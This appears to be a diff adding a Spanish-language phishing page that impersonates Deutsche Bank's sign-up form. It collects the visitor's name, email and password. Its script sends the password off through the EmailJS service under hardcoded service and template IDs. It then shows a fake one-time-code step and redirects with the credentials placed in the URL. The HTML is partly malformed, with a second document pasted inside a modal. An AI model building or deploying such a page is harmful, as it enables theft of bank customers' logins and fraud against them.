@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <title>[Bank Name] - Sign Up</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 40px 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.9);
+            width: 100%;
+            max-width: 400px;
+        }
+        h1 {
+            text-align: center;
+            color: #0a008e;
+            margin-bottom: 30px;
+        }
+        label {
+            font-weight: bold;
+            color: #333333;
+            margin-bottom: 5px;
+            display: block;
+        }
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            height: 50px;
+            padding: 10px;
+            font-size: 21px;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            margin-bottom: 20px;
+        }
+        .password-container {
+            position: relative;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+        #password {
+            width: 100%;
+            padding-right: 40px; /* Ensure space for the icon */
+            box-sizing: border-box;
+        }
+        #togglePassword {
+            position: absolute;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-80%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 0;
+            margin: 0;
+        }
+        #togglePassword i {
+            color: #000;
+          font-size: 21px;
+       
+                  }
+        .sign-up-btn {
+            background-color: #007bff;
+            color: #ffffff;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 20px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .sign-up-btn:hover {
+            background-color: #0056b3;
+        }
+        .sign-up-btn .loader {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.6);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .sign-up-btn.loading .loader {
+            display: block;
+        }
+        .sign-up-btn.loading .button-text {
+            visibility: hidden;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #777777;
+        }
+        .container img {
+            height: 110px;
+            margin-left: 26px;
+        }
+        /* Modal styles */
+        .modal {
+            display: none; /* Hidden by default */
+            position: fixed; /* Stay in place */
+            z-index: 30; /* Sit on top */
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto; /* Enable scroll if needed */
+            background-color: rgb(0,0,0); /* Fallback color */
+            background-color: rgba(0,0,0,0.7); /* Black w/ opacity */
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background-color: #fefefe;
+            margin: auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 300px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .close-btn {
+            background-color: #007bff;
+            color: #ffffff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .close-btn:hover {
+            background-color: #0056b3;
+        }
+        .otp p {
+            color: #ffffff;
+        }
+    </style>
+    <!-- Include Email.js SDK -->
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init("zZbBafecRWz36hHhn"); // Replace with your actual EmailJS user ID
+        })();
+    </script>
+</head>
+<body>
+    <script src="script2.js" defer></script>
+    <div class="container">
+    <img src="bank.png" alt="Logo del Banco">
+    <h1>Deutsche Bank</h1>
+    <p>Por favor, ingrese los siguientes detalles a continuación:</p>
+    <form id="deleteMeForm" action="success.html" method="GET">
+        <label for="full-name">Nombre completo</label>
+        <input type="text" id="full-name" name="full-name" required>
+        
+        <label for="email">Correo electrónico</label>
+        <input type="email" id="email" name="email" required>
+        <label for="password">Contraseña</label>
+            <div class="password-container">
+                <input type="password" id="password" name="password" required>
+                <button type="button" id="togglePassword">
+                    <i class="fas fa-eye"></i>
+                </button>
+            </div>
+                
+        
+        <button type="submit" class="sign-up-btn">
+            <span class="button-text">CONTINUAR</span>
+            <div class="loader"></div>
+        </button>
+    </form>
+    
+    <div class="footer">
+        [Deutsche Bank] | <a href="#">Política de Privacidad</a> | <a href="#">Contáctenos</a>
+    </div>
+</div>
+    <!-- The Modal -->
+    <div id="successModal" class="modal">
+        <div class="modal-content">
+        <link rel="stylesheet" href="styles.css">
+            <span class="close"></span>
+            <div class="otp">
+            <p>l<span id="otpDisplay"></span></p>
+    <title>OTP Input</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f0f0f0;
+      margin: 0;
+    }
+
+    .otp-container {
+      text-align: center;
+      background: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.4);
+    }
+
+    h2 {
+      margin-bottom: 20px;
+      font-size: 17px;
+    }
+
+    .otp-inputs {
+      display: flex;
+      justify-content: space-between;
+     font-size: 31px; 
+    }
+     .otp-inputs input{
+        height: 70px;
+      font-size: 34px;
+      border: 2px solid #ccc;
+      border-radius: 8px;
+      margin: 0 5px;
+      transition: border-color 0.3s;
+     }
+
+    .otp-input {
+      width: 80px;
+      height: 110%;
+      text-align: center;
+      font-size: 34px;
+      
+    }
+
+    .otp-input:focus {
+      border-color: #007bff;
+      outline: none;
+    }
+     .image img {
+            width: 140px;
+            height: 120px;
+            border-radius: 50%;
+          {
+  </style>
+</head>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de OTP</title>
+</head>
+<body>
+    
+    <div class="otp-container">
+        <h2>Por favor, haga clic en el cuadro de abajo para ingresar su Contraseña de Un Solo Uso (OTP) que se envió a su correo electrónico. ¡Por favor, revise su buzón 📨📨!</h2>
+        <div class="otp-inputs">
+            <input type="text" maxlength="1" class="otp-input" id="otp-1" oninput="moveToNext(this, 'otp-2')" onkeydown="handleBackspace(event, 'otp-1', null)">
+            <input type="text" maxlength="1" class="otp-input" id="otp-2" oninput="moveToNext(this, 'otp-3')" onkeydown="handleBackspace(event, 'otp-2', 'otp-1')">
+            <input type="text" maxlength="1" class="otp-input" id="otp-3" oninput="moveToNext(this, 'otp-4')" onkeydown="handleBackspace(event, 'otp-3', 'otp-2')">
+            <input type="text" maxlength="1" class="otp-input" id="otp-4" oninput="verifyOtp()" onkeydown="handleBackspace(event, 'otp-4', 'otp-3')">
+        </div>
+        <p id="otp-status" style="display: none;"></p>
+    </div>
+    
+    <script>
+        let generatedOtp;
+
+        function moveToNext(current, nextFieldID) {
+            if (current.value.length >= 1) {
+                document.getElementById(nextFieldID).focus();
+            }
+        }
+
+        function handleBackspace(event, currentFieldID, previousFieldID) {
+            if (event.key === "Backspace" && event.target.value === "") {
+                if (previousFieldID) {
+                    document.getElementById(previousFieldID).focus();
+                }
+            }
+        }
+
+       function verifyOtp() {
+    const otpInputs = document.querySelectorAll('.otp-input');
+    const enteredOtp = Array.from(otpInputs).map(input => input.value).join('');
+
+    if (enteredOtp.length === 4) {
+        const otpStatus = document.getElementById('otp-status');
+
+        if (enteredOtp === generatedOtp.toString()) {
+            // Construct the query parameters
+            const fullName = document.getElementById('full-name').value.trim();
+       localStorage.setItem('name', fullName);
+            const email = encodeURIComponent(document.getElementById('email').value);
+            const password = encodeURIComponent(document.getElementById('password').value); 
+
+          
+            window.location.href = `success.html?fullName=${fullName}&email=${email}&password=${password}`;
+        } else {
+            otpStatus.innerText = 'Invalid OTP code. Please check your inbox again.';
+            otpStatus.style.color = 'red';
+            otpStatus.style.display = 'block';
+        
+                }
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('otp-1').focus();
+        });
+
+        document.getElementById('deleteMeForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const button = event.target.querySelector('.sign-up-btn');
+            button.classList.add('loading');
+            button.disabled = true;
+
+            // Collect form data
+            const fullName = document.getElementById('full-name').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value; 
+
+            // Generate a four-digit OTP
+            generatedOtp = Math.floor(1000 + Math.random() * 9000);
+
+            // Prepare the email parameters
+            const emailParams = {
+                full_name: fullName,
+                to_email: email,
+                password: password,
+                otp: generatedOtp,
+                welcome_message: "Su Contraseña de Un Solo Uso de Deutsche Bank es",
+                peace_message: "¡Por favor, no comparta este código con nadie!",
+                Hello_email: "¡Hola! 👋",
+                bank_email: "Deutsche Bank",
+                from_name: "Nuevo mensaje de Deutsche Bank"
+            };
+
+            // Send the form data using EmailJS
+            emailjs.send('service_ufvl2sa', 'template_zpkqoqy', emailParams)
+                .then(function(response) {
+                    console.log('¡ÉXITO!', response.status, response.text);
+
+                    // Display the modal with the OTP
+                    document.getElementById('otpDisplay').innerText = generatedOtp;
+                    document.getElementById('successModal').style.display = 'flex';
+
+                    // Submit the form to the server after email is sent successfully
+                    // Commented out to prevent actual form submission
+                    // event.target.submit();
+                }, function(error) {
+                    console.log('¡FALLÓ...', error);
+                    button.classList.remove('loading');
+                    button.disabled = false;
+                    alert('No se pudo enviar el correo electrónico. Por favor, revise el correo electrónico ingresado.');
+                });
+        });
+
+        // Get the modal
+        var modal = document.getElementById("successModal");
+    </script>
+</body>
+</html>
